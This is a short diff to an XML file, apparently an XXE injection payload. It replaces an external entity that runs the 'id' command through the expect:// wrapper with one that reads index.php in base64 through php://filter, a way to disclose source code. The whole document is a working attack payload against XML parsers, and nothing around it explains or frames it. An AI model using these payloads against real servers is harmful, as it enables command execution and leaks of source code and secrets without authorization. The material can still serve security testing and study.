@@ -1,5 +1,5 @@
 <?xml version="1.0"?>
-<!DOCTYPE results [<!ENTITY harmless SYSTEM "expect://id">]>
+<!DOCTYPE results [<!ENTITY harmless SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
 <results>
     <result>&harmless;</result>
 </results>
